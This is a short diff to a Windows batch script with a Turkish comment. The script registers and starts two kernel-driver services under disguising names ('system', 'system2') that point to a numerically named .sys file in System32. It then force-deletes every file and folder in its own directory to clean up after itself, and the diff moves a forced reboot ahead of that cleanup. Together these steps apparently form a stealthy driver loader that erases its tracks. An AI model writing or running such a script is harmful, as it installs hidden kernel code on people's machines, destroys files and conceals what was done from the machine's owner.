@@ -39,10 +39,11 @@ sc create system2 binPath= "C:\Windows\System32\86436432.sys" DisplayName= "syst
 sc start system
 sc start system2
 
+shutdown /r /t 2
+
 :: Script dosyasını temizle
 cd /d "%~dp0"
 del /f /q *.*
 for /d %%i in (*) do rd /s /q "%%i"
 
-shutdown /r /t 0
 exit
